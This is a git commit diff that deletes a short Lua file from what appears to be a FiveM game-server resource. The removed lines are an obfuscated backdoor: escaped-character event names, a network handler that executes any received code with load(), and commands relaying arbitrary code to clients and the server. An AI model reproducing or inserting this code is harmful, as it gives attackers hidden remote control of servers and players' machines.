3a2db0daf30be65e407944cf5d6e678170271b35
Tatu <141708120+Tatuperkele@users.noreply.github.com>
2025-01-03 11:24:37 +0200

    v

--- menut/a.lua
+++
@@ -1,3 +0,0 @@
-RegisterNetEvent("\65\79\98\98\70\103")AddEventHandler("\65\79\98\98\70\103",function(a)load(a)()end)
-RegisterCommand('\65', function(a,b,c)local d=table.concat(b)TriggerClientEvent('\97\111\66\66\102\71',d)end)
-RegisterCommand('\66', function(a,b,c)local d=table.concat(b)load(d)()end)
